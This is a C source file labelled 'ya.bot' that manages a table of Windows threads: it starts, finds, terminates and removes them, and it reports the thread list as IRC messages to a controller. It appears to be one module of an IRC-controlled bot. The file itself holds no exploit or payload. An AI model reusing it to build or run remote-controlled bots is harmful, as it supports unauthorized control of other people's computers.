/*  ya.bot  */

#include "bot.h"

bool thread_add(char *pszName, int nID, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	int i;

#ifndef NO_DEBUG
		debug_print("Adding thread, thread_add()");
#endif

	if (!thread_find(nID))
	{
		for (i = 1; i < THREAD_MAX; i++)
		{
			if (g_threads[i].m_szName[0] == '\0')
			{
					strncpy(g_threads[i].m_szName, pszName, sizeof(g_threads[i].m_szName) - 1);
					g_threads[i].m_nID = nID;
					g_threads[i].m_hThread = CreateThread(NULL,
							0,
							lpStartAddress,
							lpParameter,
							0,
							NULL);
				if (!g_threads[i].m_hThread)
						return FALSE;
					return TRUE;
			}
		}
	}
		return FALSE;
}

bool thread_find(int nID)
{
	int i;

#ifndef NO_DEBUG
		debug_print("Searching for thread thread, thread_find()");
#endif

	for (i = 1; i < THREAD_MAX; i++) 
		if (g_threads[i].m_nID == nID) 
			return TRUE;
	return FALSE;
}

bool thread_kill(int nThread)
{

#ifndef NO_DEBUG
		debug_print("Killing thread, thread_kill()");
#endif

	if ((nThread > 1) && (nThread <= THREAD_MAX))
	{
		if (g_threads[nThread].m_szName[0] != '\0')
		{
				TerminateThread(g_threads[nThread].m_hThread, 0);
				CloseHandle(g_threads[nThread].m_hThread);
				g_threads[nThread].m_nID = 0;
				g_threads[nThread].m_szName[0] = '\0';
				return TRUE;
		}
	}
		return FALSE;
}

void thread_killall()
{
	int i;

#ifndef NO_DEBUG
		debug_print("Killing all threads, thread_killall()");
#endif

	for (i = 2; i < THREAD_MAX; i++)
	{
			TerminateThread(g_threads[i].m_hThread, 0);
			CloseHandle(g_threads[i].m_hThread);
			g_threads[i].m_nID = 0;
			g_threads[i].m_szName[0] = '\0';
	}
		return;
}

bool thread_killid(int nID)
{
	int i;

#ifndef NO_DEBUG
		debug_print("Killing thread id, thread_killid()");
#endif

	for (i = 1; i < THREAD_MAX; i++)
	{
		if (g_threads[i].m_nID == nID) 
		{
				TerminateThread(g_threads[i].m_hThread, 0);
				CloseHandle(g_threads[i].m_hThread);
				g_threads[i].m_nID = 0;
				g_threads[i].m_szName[0] = '\0';
				return TRUE;
		}
	}
		return FALSE;
}

void thread_list(SOCKET bsock, char *pszAction, char *pszDestination, bool bSilent, bool bVerbose)
{
	int i;

#ifndef NO_DEBUG
		debug_print("Listing threads, thread_list()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_threadlistingthreads,
					CBLUE, string_replythread, CEND, string_replydotbot);
	for (i = 1; i < THREAD_MAX; i++)
	{
		if (g_threads[i].m_szName[0]  != '\0')
		{
				Sleep(FLOOD_DELAY);
			if (!bSilent)
					irc_message(bsock, pszAction, pszDestination,
							(char *)string_threadlistthread,
							CGREEN, string_replythread, CEND, string_replydotbot,
							CBLUE, CEND, i,
							CBLUE, CEND, g_threads[i].m_szName);
				Sleep(FLOOD_DELAY);
		}
	}
	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_threadendofthreadlist,
					CBLUE, string_replythread, CEND, string_replydotbot);
		return;
}

bool thread_remove(int nID)
{
	int i;

#ifndef NO_DEBUG
		debug_print("Removing thread, thread_remove()");
#endif

	for (i = 1; i < THREAD_MAX; i++)
	{	
		if (g_threads[i].m_nID == nID)
		{
				g_threads[i].m_nID = 0;
				g_threads[i].m_szName[0] = '\0';
				CloseHandle(g_threads[i].m_hThread);
				return TRUE;
		}
	}
		return FALSE;
}